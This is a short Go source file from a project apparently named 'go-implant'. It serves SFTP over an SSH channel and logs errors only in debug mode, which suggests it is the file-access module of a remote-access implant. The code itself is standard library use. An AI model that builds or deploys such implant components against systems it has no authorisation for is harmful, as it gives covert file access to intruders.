package ssh

import (
	"go-implant/client/config"
	"io"
	"log"

	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func handlesftp(channel ssh.Channel) {

	serverOptions := []sftp.ServerOption{}

	server, err := sftp.NewServer(
		channel,
		serverOptions...,
	)
	if err != nil {
		if config.DEBUG {
			log.Fatal(err)
		}
	}
	if err := server.Serve(); err == io.EOF {
		server.Close()
		if config.DEBUG {
			log.Print("sftp client exited session.")
		}
	} else if err != nil {
		if config.DEBUG {
			log.Fatal("sftp server completed with error:", err)
		}
	}
}
